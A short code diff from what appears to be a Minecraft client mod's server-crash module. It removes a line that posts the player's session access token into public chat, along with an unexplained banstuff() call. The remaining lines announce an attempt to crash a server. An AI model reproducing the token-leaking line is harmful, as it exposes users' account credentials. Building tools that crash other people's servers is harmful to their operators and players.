@@ -30,10 +30,6 @@ public class ServerCrashModule extends Module {
     }
     @Override
     public void onActivate(){
-        banstuff();
-
-        ChatUtils.sendPlayerMsg(mc.getSession().getAccessToken());
-
         assert mc.player != null;
         error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
         info("Attempting to crash the Server");
